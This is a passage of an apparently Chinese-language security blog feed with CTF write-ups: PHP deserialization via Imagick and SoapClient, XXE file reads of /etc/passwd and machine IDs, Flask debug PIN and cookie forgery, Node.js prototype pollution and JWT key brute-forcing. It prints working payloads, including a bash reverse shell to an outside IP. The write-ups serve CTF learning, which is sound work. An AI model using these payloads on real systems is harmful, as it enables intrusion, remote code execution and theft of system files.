class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:14:&quot;vid:msl:&#x2F;tmp&#x2F;a&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;</code></pre><p>然后输出获得的session</p><p>再次清除临时文件</p><p>开始写入xml文档，第一次写入的文档内容如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt; &lt;read filename&#x3D;&quot;mvg:&#x2F;flag[20x20+20+20]&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;mvg:&#x2F;tmp&#x2F;yyz&quot;&#x2F;&gt;&lt;&#x2F;group&gt;</code></pre><p>反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;a:1:&#123;i:0;s:17:&quot;vid:msl:&#x2F;tmp&#x2F;php*&quot;;&#125;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;</code></pre><p>第二次写入内容如下</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;group&gt;&lt;image &gt;&lt;read filename&#x3D;&quot;inline:data:text&#x2F;8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9&quot;&#x2F;&gt;&lt;&#x2F;image&gt;&lt;write filename&#x3D;&quot;8BIM:&#x2F;tmp&#x2F;sess_&#123;session_id&#125;&quot;&#x2F;&gt;&lt;&#x2F;group&gt;</code></pre><p>反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">yyz|O:13:&quot;fumo_backdoor&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;&#x2F;tmp&#x2F;yyz&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;&#125;</code></pre><p>最后是带出flag，反序列化内容如下</p><pre class="line-numbers language-none"><code class="language-none">O:13:&quot;fumo_backdoor&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;&#x2F;tmp&#x2F;yyz&quot;;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;&#125;</code></pre><p>可能是手工构造存在什么小细节不好把握吧，太难搞了，以后有这种题目还是尽量通过脚本来接提拔。。。太难受了，这题总共做了三天差不多😭😭😭</p><h3 id="pypyp？"><a href="#pypyp？" class="headerlink" title="pypyp？"></a>pypyp？</h3><p>又是很坑爹的一题😭😭😭，前前后后一共做了四天差不多。不过也学到了许多知识</p><p>一进入页面提示session not started，题目提示&#x2F;app&#x2F;app.py，访问看看</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218997.png" alt="image-20230713002110951"></p><p>似乎不能直接利用。。。到这里就没啥思路了</p><p>最后上网查了一下WP才知道这里的考点是PHP的<code>session_upload_progress</code>强制生成session，因为题目提示里有个app.py,我就以为网站都是用python编写的。这里是我思维局限了，没去Wappalyzer看一下这个网站用的是什么语言。其实在这个session页面用的是PHP编写。</p><p><code>session_upload_progress</code>是个老考点了，不过太久没做题我就把这个知识点给忘了😓</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218992.png" alt="image-20230713001809914"></p><p>因为直接发送请求包并不会在服务器上创建会话，所以在这里利用<code>session_upload_progress</code>的特点来从服务器上强制创建一个session，使用如下脚本来构造一个上传文件与请求进度同时存在的文件</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;115.239.215.75:8081&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>这里要抓包在请求包中添加<code>Cookie: PHPSESSID</code>才可以</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218663.png" alt="image-20230713162129739"></p><p>过去之后获得源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);    if(!isset($_SESSION))&#123;        die(&#39;Session not started&#39;);    &#125;    highlight_file(__FILE__);    $type &#x3D; $_SESSION[&#39;type&#39;];    $properties &#x3D; $_SESSION[&#39;properties&#39;];    echo urlencode($_POST[&#39;data&#39;]);    extract(unserialize($_POST[&#39;data&#39;]));    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;    $object &#x3D; unserialize(urldecode($properties));    $object -&gt; sctf();    exit();    &#125; else if(is_array($properties))&#123;        $object &#x3D; new $type($properties[0],$properties[1]);    &#125; else &#123;        $object &#x3D; file_get_contents(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&#39;.$properties);    &#125;    echo &quot;this is the object: $object &lt;br&gt;&quot;;?&gt;</code></pre><p>看起来有点复杂，一行一行看下去</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    error_reporting(0);    if(!isset($_SESSION))&#123;        die(&#39;Session not started&#39;);    &#125;&#x2F;&#x2F;判断是否有session，若无则直接退出    highlight_file(__FILE__);    $type &#x3D; $_SESSION[&#39;type&#39;];    $properties &#x3D; $_SESSION[&#39;properties&#39;];&#x2F;&#x2F;在session读取两个属性的值并赋值    echo urlencode($_POST[&#39;data&#39;]);&#x2F;&#x2F;可控数据data    extract(unserialize($_POST[&#39;data&#39;]));&#x2F;&#x2F;对data进行反序列化。extract，可以将数组中的键值对转换为变量和对应的值，可以利用此函数进行变量覆盖    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties)))&#123;&#x2F;&#x2F;判断，若properties为字符串且能反序列化，则进入如下判断    $object &#x3D; unserialize(urldecode($properties));&#x2F;&#x2F;将object设置为properties的反序列化对象    $object -&gt; sctf();&#x2F;&#x2F;调用sctf()方法    exit();    &#125; else if(is_array($properties))&#123;        $object &#x3D; new $type($properties[0],$properties[1]);&#x2F;&#x2F;若properties方法是数组，则把type当做类名，properties的前两个值当做参数实例化一个类    &#125; else &#123;        $object &#x3D; file_get_contents(&#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&#39;.$properties);&#x2F;&#x2F;通过内网读取文件，其中文件由properties的值决定    &#125;    echo &quot;this is the object: $object &lt;br&gt;&quot;;&#x2F;&#x2F;最后会由echo输出object内容?&gt;</code></pre><p>一开始看这里我的想法是可能需要控制cookie中的type和properties中的值，或者是不是可以构造一个SCTF方法，在反序列化的时候进行应用。但是很快发现这样行不通，不过type和properties的值可以通过extract函数控制，这样的话我们就可以控制if的条件判断。</p><p>然后就是data的反序列化，这里又有个问题，就是在这段源码里是没有魔术方法的，所以不是按照正常的反序列化的路来走，而是要利用原生类进行反序列化。（又是新的知识点）</p><p>这里利用的是SimpleXMLElement进行反序列化，可以实现远程xml文件的载入。</p><p>所以要利用这个点来读文件先看看</p><p>反序列化的点在if的第二个分支上，先读一个app.py</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$class&#x3D;&#39;SimpleXMLElement&#39;;$xml&#x3D;&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&#39;;$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;array(&#39;$xml&#39;),&#39;type&#39;&#x3D;$class);echo serialize($arr);#a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;app&#x2F;app.py&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;</code></pre><p>源码如下，debug&#x3D;True，可以尝试进入控制台查看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from flask import Flask app &#x3D; Flask(__name__) @app.route(&#39;&#x2F;&#39;) def index(): return &#39;Hello World!&#39; if __name__ &#x3D;&#x3D; &#39;__main__&#39;: app.run(host&#x3D;&quot;0.0.0.0&quot;,debug&#x3D;True) </code></pre><p>访问console看看</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;&#39;console&#39;);echo serialize($arr);#a:1:&#123;s:10:&quot;properties&quot;;s:7:&quot;console&quot;;&#125;</code></pre><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218014.png" alt="image-20230713232847848"></p><p>这里还有一个之前的功能点没利用到，就是SCTF()，我之前的想法是构造一个然后在反序列化的时候执行，但是仔细一想就知道行不通。</p><p>这里的正确做法依然是利用PHP原生类反序列化，利用的是SoapClient类。</p><blockquote><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p></blockquote><p>SoapClient类内部有一个__call()魔术方法，利用访问sctf()这个不存在的方法可触发该魔术方法</p><blockquote><p>当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p><p>该类的构造函数如下：</p><pre class="line-numbers language-none"><code class="language-none">&gt;public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li></ul></blockquote><ul><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>这里的做法是利用SoapClient类进行SSRF+CRLF利用组合拳。</p><p>在本地搭建flask调试，输入pin码可以看到如下参数</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console?__debugger__&#x3D;yes&amp;cmd&#x3D;pinauth&amp;pin&#x3D;310-566-904&amp;s&#x3D;m2gd46SPCKq3xBvkONlJ</code></pre><ul><li>__debugger__：调试模式的是否开启</li><li>cmd：输入的命令</li><li>pin：即pin码</li><li>s：代表secret</li></ul><p>我们进入控制台后会返回一个cookie</p><pre class="line-numbers language-none"><code class="language-none">__wzd148551f810a0da4e55b5&#x3D;1689267106|d9bcbb95c7f2</code></pre><p>cookie格式如下</p><pre class="line-numbers language-none"><code class="language-none">Cookie: cookieName&#x3D;时间戳|hash签名</code></pre><p>进入控制台后输入命令可以看到有如下参数</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;console?&amp;__debugger__&#x3D;yes&amp;cmd&#x3D;whoami&amp;frm&#x3D;0&amp;s&#x3D;m2gd46SPCKq3xBvkONlJ</code></pre><p>这里的思路是伪造cookie然后命令执行反弹shell</p><p>其中secret我们可以通过访问&#x2F;console获得。</p><p>cookie伪造&amp;pin码爆破脚本：<a href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code">https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code</a></p><p>需要提供的参数有<code>username</code>、<code>modname</code>、<code>appname</code>、<code>basefile</code>、<code>uuid</code>、<code>machineid</code>。</p><p>获得方式如下</p><ul><li>username：查看&#x2F;etc&#x2F;passwd 一般是app</li><li>modename: 默认flask.app</li><li>uuid：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 16进制转10进制</li><li>machineid：machine_id由三个合并(docker环境就只需后两个)：1.&#x2F;etc&#x2F;machine-id 2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 3.&#x2F;proc&#x2F;self&#x2F;cgroup</li><li>basefile：&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py （默认路径）</li></ul><blockquote><p>伪造以前首先需要知道python的版本，我们查询一下是否存在 python3.8路径的<code>LICENSE.txt</code></p><pre class="line-numbers language-none"><code class="language-none">&gt;&#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;LICENSE.txt</code></pre></blockquote><p>以上文件皆使用XXE来读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$class&#x3D;&#39;SimpleXMLElement&#39;;$xml&#x3D;&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;文件路径&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&#39;;$arr&#x3D;array(&#39;properties&#39;&#x3D;&gt;array($xml,&#39;2&#39;),&#39;type&#39;&#x3D;&gt;$class);echo serialize($arr);</code></pre><pre class="line-numbers language-none"><code class="language-none">a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:98:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;02:42:ac:13:00:02 &#x3D;&gt;2661721902 a:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:118:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;349b3354-f67f-4438-b395-4fbc01171fdda:2:&#123;s:10:&quot;properties&quot;;a:2:&#123;i:0;s:104:&quot;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;&quot;;i:1;s:1:&quot;2&quot;;&#125;s:4:&quot;type&quot;;s:16:&quot;SimpleXMLElement&quot;;&#125;96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687 </code></pre><p>获得了这些数据之后可以开始伪造cookie</p><pre class="line-numbers language-none"><code class="language-none">python3 exp.py --username app --modname flask.app --appname Flask --basefile &#x2F;usr&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py --uuid 2485378023426 --machineid 349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</code></pre><p>结果如下</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202307230218824.png" alt="image-20230714153646385"></p><pre class="line-numbers language-none"><code class="language-none">Cookie:  __wzdb2a60e2b19822632a67c&#x3D;1689320197|11b8517fb9fbPIN:  121-260-582</code></pre><p>通过soapclient去访问debug界面，同时也只有soapclient可以做到携带cookie访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;console?&amp;__debugger__&#x3D;yes&amp;cmd&#x3D;__import__(&quot;os&quot;).popen(&quot;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.223.5.175&#x2F;9080 &lt;&amp;1\&quot;&quot;)&amp;frm&#x3D;0&amp;s&#x3D;ECDJpSJ4XJ5AZJtaxMHT&#39;;$headers &#x3D; array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: __wzdb2a60e2b19822632a67c&#x3D;1689320197|11b8517fb9fb&#39;);$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,                               &#39;user_agent&#39; &#x3D;&gt;&quot;sammy\r\n&quot;.join(&quot;\r\n&quot;,$headers),                               &#39;uri&#39;&#x3D;&gt; &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;));$arr&#x3D;array(&quot;properties&quot;&#x3D;&gt;urlencode(serialize($b)));echo serialize($arr);#</code></pre><p>不知道什么原因现在反弹不了shell，试了好几天了，中间有一次好不容易反弹出来了但又不知道怎么搞的让我弄断了，太搞心态了😭😭😭。但是步骤就是这样。这题也就记录到这里了。看其他师傅的wp是说后面使用SUID提权读flag。</p><p>最后感谢Boogipop师傅的解惑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;

&lt;h1 id=&quot;SCTF2023&quot;&gt;&lt;a href=&quot;#SCTF2023&quot; class=&quot;headerlink&quot; title=&quot;SCTF2023&quot;&gt;&lt;/a&gt;SCTF2023&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>一道nodejs污染+jwt爆破的题</title>
    <link href="https://mizore.site/article/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://mizore.site/article/%E4%B8%80%E9%81%93nodejs%E6%B1%A1%E6%9F%93+jwt%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/Nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-06-30T16:56:45.884Z</published>
    <updated>2024-11-24T16:52:25.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Nodejs命令执行"><a href="#Nodejs命令执行" class="headerlink" title="Nodejs命令执行"></a>Nodejs命令执行</h2><p>又是复现其他师傅博客上的题目的一天~</p><p>这题的整体结构还是比较简单的，但是做的过程还是踩了不少的坑。</p><p><img src="/../../img/nodejs_image/1.png"></p><p>看起来需要获得admin权限</p><p>抓个包看一下</p><p><img src="/../../img/nodejs_image/2.png"></p><p>coockie部分看起来有点像JWT，理由是由三部分加密组成，且由点进行连接。</p><p>到jwt.io进行解密</p><p><img src="/../../img/nodejs_image/3.png"></p><p>尝试将guest改成admin再传入，然而还是不行。</p><p>可以推测这里是使用了密钥进行加密，这里对jwt弱密钥进行爆破，编写如下脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">#jwtj加密key值爆破脚本import jwt#在这里输入jwt tokenjwt_str&#x3D;&#39;&#39;f&#x3D;open(&#39;keys.txt&#39;)#在这里指定字典文件for i in f:    try:        jwt.decode(jwt_str, verify&#x3D;True, key&#x3D;i, algorithms&#x3D;&#39;HS256&#39;)        print(&#39;the key is &#39;+i)        break    except (jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):        print(&#39;there are something wrong,but the key is&#39; + i)#数据部分预定义字段错误,但是key是正确的        break    except jwt.exceptions.InvalidSignatureError:        continueelse:    print(&#39;found no key&#39;)</code></pre><p><img src="/../../img/nodejs_image/4.png"></p><p>重新进行编码成功进入<code>/source</code>页面，里面是如下源码</p><pre class="line-numbers language-Javascript" data-language="Javascript"><code class="language-Javascript">const express &#x3D; require(&quot;express&quot;);const jwt &#x3D; require(&quot;jsonwebtoken&quot;);const app &#x3D; express();const bodyParser &#x3D; require(&quot;body-parser&quot;);const path &#x3D; require(&quot;path&quot;);const jwt_secret &#x3D; &quot;toor&quot;;const cookieParser &#x3D; require(&quot;cookie-parser&quot;);const putil_merge &#x3D; require(&quot;putil-merge&quot;);app.use(cookieParser());app.use(bodyParser.urlencoded(&#123; extended: true &#125;)).use(bodyParser.json());var Super &#x3D; &#123;&#125;;var safecode &#x3D; function (code) &#123;  let validInput &#x3D;    &#x2F;global|mainModule|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*&#x2F;gi;  return !validInput.test(code);&#125;;app.all(&quot;&#x2F;code&quot;, (req, res) &#x3D;&gt; &#123;  res.type(&quot;html&quot;);  if (req.method &#x3D;&#x3D; &quot;POST&quot; &amp;&amp; req.body) &#123;    putil_merge(&#123;&#125;, req.body, &#123; deep: true &#125;);  &#125;  res.send(&quot;welcome to code&quot;);&#125;);app.get(&quot;&#x2F;source&quot;, (req, res) &#x3D;&gt; &#123;  res.type(&quot;html&quot;);  var auth &#x3D; req.cookies.auth;  jwt.verify(auth, jwt_secret, function (err, decoded) &#123;    if (decoded.user &#x3D;&#x3D;&#x3D; &quot;admin&quot;) &#123;      res.sendFile(path.join(__dirname + &quot;&#x2F;app.js&quot;));    &#125; else &#123;      res.end(&quot;you are not admin&quot;);    &#125;  &#125;);&#125;);app.all(&quot;&#x2F;root&quot;, (req, res) &#x3D;&gt; &#123;  res.type(&quot;html&quot;);  code &#x3D; req.body.code;  console.log(req.body.key);  if (!req.body.key || req.body.key &#x3D;&#x3D;&#x3D; undefined || req.body.key &#x3D;&#x3D;&#x3D; null) &#123;    res.send(&quot;please input key&quot;);  &#125; else &#123;    if (Super[&quot;userid&quot;] &#x3D;&#x3D;&#x3D; &quot;Superadmin&quot; + req.body.key) &#123;      if (!safecode(code)) &#123;        res.send(&quot;forbidden!&quot;);      &#125; else &#123;        res.send(eval(code));      &#125;    &#125; else &#123;      res.send(&quot;You are not the Super&quot;);    &#125;  &#125;&#125;);app.get(&quot;&#x2F;&quot;, (req, res) &#x3D;&gt; &#123;  res.type(&quot;html&quot;);  var token &#x3D; jwt.sign(&#123; user: &quot;guest&quot; &#125;, jwt_secret, &#123; algorithm: &quot;HS256&quot; &#125;);  res.cookie(&quot;auth &quot;, token);  res.end(&quot;Only admin can get source in &#x2F;source&quot;);&#125;);app.listen(3000, () &#x3D;&gt; console.log(&quot;Server started on port 3000&quot;));</code></pre><p>在<code>/root</code>路由下有一个eval函数可以执行命令，然而要进入eval函数的判断前提是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot;+req.body.key</code>和<code>key</code>值不为空</p><p>在往上在<code>code</code>路由下有一个<code>putil_merge</code>函数进行merge操作，可以推断这里要使用原型链污染。</p><p>这里现在<code>code</code>处污染<code>userid</code>的值，然后再在root下传入<code>key</code>和<code>code</code>的值便可以进行命令执行了。</p><p>原先我不知道<code>req.body.key</code> 这个参数可以用POST或者json直接传参赋值，还在想要如何污染才能绕过判断，所以在这里卡了一会。。。</p><p>其实在程序最上面那一部分就说明了可以使用json或者POST传参</p><pre class="line-numbers language-Javascript" data-language="Javascript"><code class="language-Javascript">app.use(bodyParser.urlencoded(&#123; extended: true &#125;)).use(bodyParser.json());</code></pre><p>卡住我的第二个点是我不知道<code>Super[&quot;userid&quot;]</code>其实就相当于<code>Super.userid</code>所以只要污染原型链上的<code>userid</code>就够了，在头几行也定义了说<code>Super</code>是一个空对象。这搞得我也想了一段时间要怎么去污染<code>Super[&quot;userid&quot;]</code>这个参数。。。</p><p>还有就是<code>Super[&quot;userid&quot;] === &quot;Superadmin&quot; + req.body.key</code>中的<code>&quot;Superadmin&quot; + req.body.key</code>其实就是简单的字符串拼接，当时也不知道自己是脑袋抽了还是怎么了，想不过来这个要怎么处理。。。</p><p>该清楚上面那些原理后，接着可以构造发包了。</p><p>首先是code路由下的构造</p><p><img src="/../../img/nodejs_image/5.png"></p><p>这里需要注意的是需要在请求头中加入<code>Content-type:application/json</code>,我一开始没有注意，把它加到<code>Accept</code>头里去了，整了半天才发下加错地方了。。。。</p><p>接着是root路由下的构造</p><p><img src="/../../img/nodejs_image/6.png"></p><p><code>key</code>值传入<code>zzz</code>与<code>Superadmin</code>拼接通过判断，同时<code>code</code>进行命令执行。</p><p>这里使用的是POST直接传参，所以要写成<code>Content-type:application/x-www-form-urlencoded</code></p><p>在源码处我们有注意到<code>code</code>其实是进行了正则匹配过滤，可以使用一些常见bypass进行绕过</p><pre class="line-numbers language-none"><code class="language-none">16进制编码unicode编码加号拼接模板字符串concat函数连接base64编码</code></pre><p>在这里我是用的是16进制编码。另外我发现只有进行同步进程创建才可以成功执行命令。</p><p>最后在记录一个大坑，今天这个洞其实是个CVE，影响版本从1.0.0 到 3.6.6。而我一开始安装的putil-merge是3.10.10的版本，已经修复了该反序列化漏洞，卡了我一下午。。。。后面才发现是因为版本原因，下次也要多注意一点了。。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/237032#h2-0">nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台 (anquanke.com)</a></p><p><a href="http://47.103.121.189/2022/08/19/node-js%E4%B8%80%E9%81%93%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%B8%A9%E5%9D%91%E8%AE%B0/">哈哈，骗你的！ヾ(ﾟ∀ﾟゞ)</a></p><p><a href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Nodejs命令执行&quot;&gt;&lt;a href=&quot;#Nodejs命令执行&quot; class=&quot;headerlink&quot; title=&quot;Nodejs命令执行&quot;&gt;&lt;/a&gt;Nodejs命令执行&lt;/h2&gt;&lt;p&gt;又是复现其他师傅博客上的题目的一天~&lt;/p&gt;
&lt;p&gt;这题的整体结构还是比较简</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>D^3 CTF 2021 8-bit pub复现</title>
    <link href="https://mizore.site/article/D^3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D^3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/"/>
    <id>https://mizore.site/article/D^3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/D^3%20CTF%202021%208-bit%20pub%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-06-28T13:08:13.489Z</published>
    <updated>2024-11-24T16:51:56.494Z</updated>
    
    <content type="html"><![CDATA[<h3 id="D-3-CTF-2021-8-bit-pub复现"><a href="#D-3-CTF-2021-8-bit-pub复现" class="headerlink" title="D^3 CTF 2021 8-bit pub复现"></a>D^3 CTF 2021 8-bit pub复现</h3><p>这题是顺着群里师傅的链接摸到的，前前后后总共拖了三天才完成。。。。拖延症太难受了</p><p>github题目仓库：<a href="https://github.com/crumbledwall/CTFChallenges/tree/main/D3CTF2021/8-bit_pub">CTFChallenges&#x2F;D3CTF2021&#x2F;8-bit_pub at main · crumbledwall&#x2F;CTFChallenges (github.com)</a></p><p>根据师傅所说比赛的时候是给了源码的，所以我们先从源码入手，github上直接拖下来的题目文件是给docker用的，这里要先输入<code>npm install</code>补全一些依赖库，到时候审计的时候用得上。</p><p><img src="/../../img/8-bit%20pub-images/1.png"></p><p>首先尝试注册登录，然而并没有什么卵用，题目需要你拿到admin的账号</p><p>在<code>route/index.js</code>处可以看到各个功能的路由，查看注册和登录的源码文件。</p><p>可以看到如下代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"> sql.query(      &quot;SELECT * FROM users WHERE username &#x3D; ? AND password &#x3D; ?&quot;,      [username, password],      function (err, res) &#123;        if (err) &#123;          console.log(&quot;error: &quot;, err);          return done(err, null);        &#125; else &#123;          return done(null, res);        &#125;      &#125;    );  &#125;,&#125;; signup: function (username, password, done) &#123;    sql.query(      &quot;SELECT * FROM users WHERE username &#x3D; ?&quot;,      [username],      function (err, res) &#123;.......</code></pre><p>这里的sql语句使用了占位符，会对传进来的参数进行转义，所以没办法进行sql注入。</p><p>但是在node-mysql文档的末尾有这么一段话</p><blockquote><p><strong>注意：</strong>与预处理语句不同的是，<code>?</code>就算出现在注释或字符串里，也会被替换成对应的值。</p><p>不同类型的值会按不同的规则进行转义，规则如下：</p><ul><li>数字保持不变</li><li>布尔值会被转换为<code>true</code>&#x2F;<code>false</code></li><li>日期对象转换为<code>&#39;YYYY-mm-dd HH:ii:ss&#39;</code>字符串</li><li>Buffer对象会被转换为十六进制字符串，例如<code>X&#39;0fa5&#39;</code></li><li>字符串会被安全转义</li><li>数组会被转换为列表，例如<code>[&#39;a&#39;, &#39;b&#39;]</code>会被转换为<code>&#39;a&#39;, &#39;b&#39;</code></li><li>嵌套数组会被转换为分组列表(用于批量插入)，例如<code>[[&#39;a&#39;, 